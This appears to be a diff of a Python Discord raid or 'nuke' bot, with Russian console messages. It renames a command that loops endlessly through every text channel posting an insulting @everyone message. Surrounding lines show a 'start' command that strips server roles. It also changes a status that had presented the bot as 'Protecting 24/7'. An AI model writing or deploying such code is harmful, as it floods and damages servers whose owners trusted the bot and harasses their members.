@@ -26,7 +26,7 @@ client = commands.Bot(command_prefix='$', intents=intents )
 
 @client.event
 async def on_ready():
-    await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
+    await client.change_presence(status=discord.Status.online, activity=discord.Game('Makson bot 24/7'))
     print(f"""{Fore.RED}
 
   ____ _    _   _ _____ _____ _   _ 
@@ -157,11 +157,11 @@ async def start(ctx):
   print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")
 
 @client.command()
-async def ml(ctx):
+async def lucifer(ctx):
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
     while True:
         for channel in ctx.guild.text_channels:
-          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
+          await channel.send("Люцифер лошара))) @everyone")
 
 @client.command()
 async def gamehelp(ctx):
